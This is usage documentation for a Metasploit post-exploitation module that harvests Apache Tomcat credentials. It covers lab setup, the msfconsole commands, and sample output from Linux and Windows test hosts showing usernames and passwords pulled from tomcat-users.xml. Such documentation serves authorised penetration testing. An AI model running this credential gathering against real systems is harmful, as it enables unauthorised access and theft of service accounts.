## Creating A Testing Environment

  For this module to work you need a linux or windows machine.

  * For linux you can run something like `apt-get install tomcat7` to get a working tomcat service.
  * For WIndows you can download tomcat from http://tomcat.apache.org/ and then install it as a service.

This module has been tested against:

  1. Xubuntu and Ubuntu Server 16.04 with tomcat 7, 8.
  2. Windows 10 with tomcat 6, 7.
  3. Windows XP with tomcat 5.5, 6, 7, 8

This module was not tested against, but may work against:

  1. Other versions of linux running tomcat v4-9
  2. Other version of windows running tomcat v4-9

## Verification Steps

  1. Start msfconsole
  2. Obatin a meterpreter session via whatever method
  3. Do: `use post/multi/gather/tomcat_gather`
  4. Do: `set session #`
  5. Do: `run`

## Scenarios

### Xubuntu 16.04 with tomcat 7 and 8

#### Running without read permissions

    msf post(tomcat_gather) > set session 1
    session => 1
    msf post(tomcat_gather) > run

    [*] [2017.03.31-10:19:27] Unix OS detected
    [*] [2017.03.31-10:19:28] /etc/tomcat7/tomcat-users.xml found
    [-] [2017.03.31-10:19:28] Failed to open file: /etc/tomcat7/tomcat-users.xml: core_channel_open: Operation failed: 1
    [*] [2017.03.31-10:19:28] Cannot open /etc/tomcat7/tomcat-users.xml you probably don't have permission to open the file or parsing failed.
    [*] [2017.03.31-10:19:28] /etc/tomcat8/tomcat-users.xml found
    [-] [2017.03.31-10:19:28] Failed to open file: /etc/tomcat8/tomcat-users.xml: core_channel_open: Operation failed: 1
    [*] [2017.03.31-10:19:28] Cannot open /etc/tomcat8/tomcat-users.xml you probably don't have permission to open the file or parsing failed.
    [*] [2017.03.31-10:19:28] Attempting to extract Tomcat listening ports from /etc/tomcat7/server.xml
    [-] [2017.03.31-10:19:28] Failed to open file: /etc/tomcat7/server.xml: core_channel_open: Operation failed: 1
    [*] [2017.03.31-10:19:28] Cannot open /etc/tomcat7/server.xml you probably don't have permission to open the file or parsing failed
    [*] [2017.03.31-10:19:28] Attempting to extract Tomcat listening ports from /etc/tomcat8/server.xml
    [-] [2017.03.31-10:19:28] Failed to open file: /etc/tomcat8/server.xml: core_channel_open: Operation failed: 1
    [*] [2017.03.31-10:19:28] Cannot open /etc/tomcat8/server.xml you probably don't have permission to open the file or parsing failed
    [*] [2017.03.31-10:19:28] No user credentials have been found
    [*] Post module execution completed

#### Running with read permissions

    msf post(tomcat_gather) > set session 2
    session => 2
    msf post(tomcat_gather) > run

    [*] [2017.03.31-10:33:14] Unix OS detected
    [*] [2017.03.31-10:33:15] /etc/tomcat7/tomcat-users.xml found
    [*] [2017.03.31-10:33:15] /etc/tomcat8/tomcat-users.xml found
    [*] [2017.03.31-10:33:15] Attempting to extract Tomcat listening ports from /etc/tomcat7/server.xml
    [*] [2017.03.31-10:33:15] Attempting to extract Tomcat listening ports from /etc/tomcat8/server.xml
    [+] [2017.03.31-10:33:16] Username and password found in /etc/tomcat7/tomcat-users.xml - tomcat2:s3cret
    [+] [2017.03.31-10:33:16] Username and password found in /etc/tomcat8/tomcat-users.xml - tomcat2:s3cret
    [*] Post module execution completed
        
    msf post(tomcat_gather) > creds
    Credentials
    ===========

    host        origin      service            public   private  realm  private_type
    ----        ------      -------            ------   -------  -----  ------------
    10.10.10.6  10.10.10.6  8080/tcp (Tomcat)  tomcat2  s3cret          Password


### Windows 10 with tomcat 7

#### Running with read permissions

    msf post(tomcat_gather) > run

    [*] [2017.03.31-10:43:18] Windows OS detected, enumerating services
    [+] [2017.03.31-10:43:18] Tomcat service found
    [*] [2017.03.31-10:43:18] C:\Users\XXX\Desktop\apache-tomcat-7.0.75\conf\tomcat-users.xml found!
    [+] [2017.03.31-10:43:19] Username and password found in C:\Users\XXX\Desktop\apache-tomcat-7.0.75\conf\tomcat-users.xml - tomcat:tomcat
    [+] [2017.03.31-10:43:19] Username and password found in C:\Users\XXX\Desktop\apache-tomcat-7.0.75\conf\tomcat-users.xml - both:<must-be-changed>
    [+] [2017.03.31-10:43:19] Username and password found in C:\Users\XXX\Desktop\apache-tomcat-7.0.75\conf\tomcat-users.xml - role1:<must-be-changed>
    [*] Post module execution completed

    msf post(tomcat_gather) > creds
    Credentials
    ===========

    host        origin      service            public   private            realm  private_type
    ----        ------      -------            ------   -------            -----  ------------
    10.10.10.6  10.10.10.6  8080/tcp (Tomcat)  tomcat2  s3cret                    Password
    10.10.10.7  10.10.10.7  8080/tcp (Tomcat)  tomcat   tomcat                    Password
    10.10.10.7  10.10.10.7  8080/tcp (Tomcat)  both     <must-be-changed>         Password
    10.10.10.7  10.10.10.7  8080/tcp (Tomcat)  role1    <must-be-changed>         Password